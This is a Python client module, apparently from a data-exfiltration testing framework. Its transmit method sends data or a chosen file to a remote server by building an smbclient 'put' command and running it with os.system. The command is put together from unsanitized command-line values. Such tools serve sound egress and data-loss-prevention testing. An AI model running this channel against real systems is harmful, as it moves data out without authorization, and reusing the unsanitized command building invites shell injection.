"""

This is the template that should be used for client modules.
A brief description of the client module can/should be placed
up here.  All necessary imports should be placed between the
comments and class declaration.

Finally, be sure to rename your client module to a .py file

"""

import os
from common import helpers


class Client:

    # Within __init__, you have access to everything passed in
    # via the command line.  self.protocol is the variable listed
    # when running --list-clients and is what is used in conjunction
    # with --client <client>.  self.protocol is the only required attribute
    # of the object.
    def __init__(self, cli_object):
        self.protocol = 'smb'
        self.remote_server = cli_object.ip
        if cli_object.file is None:
            self.file_transfer = False
        else:
            if "/" in cli_object.file:
                self.file_transfer = cli_object.file
                self.file_name = cli_object.file.split("/")[-1]
            else:
                self.file_name = cli_object.file

        if cli_object.client_port is None:
            self.port = 445
        else:
            self.port = cli_object.client_port

    # transmit is the only required function within the object.  It is what
    # called by the framework to transmit data.  However, you can create as 
    # many "sub functions" for transmit to invoke as needed.  "data_to_transmit".
    # is a variable passed in by the framework which contains the data that 
    # is to be sent out by the client.
    def transmit(self, data_to_transmit):

        # find current directory, make directory for mounting share
        # current directory
        exfil_directory = os.path.join(os.getcwd(), "mount")
        mount_path = exfil_directory + "/"

        # Check to make sure the agent directory exists, and a loot
        # directory for the agent.  If not, make them
        if not os.path.isdir(mount_path):
            os.makedirs(mount_path)

        # Base command to copy file over smb
        smb_command = f"smbclient \\\\\\\\{self.remote_server}" + f"\\\\TRANSFER -N -p {self.port} -c \"put "

        # If using a file, copy it, else write to disk and then copy
        if not self.file_transfer:
            smb_file_name = helpers.writeout_text_data(data_to_transmit)
            smb_full_path = helpers.ea_path() + "/" + smb_file_name

            smb_command += smb_file_name + "\""

        else:
            smb_command += self.file_transfer + " " + self.file_name + "\""
            smb_file_name = self.file_transfer

        print(smb_command)
        os.system(smb_command)

        if not self.file_transfer:
            os.remove(smb_full_path)

        print('[*] File Transmitted!')
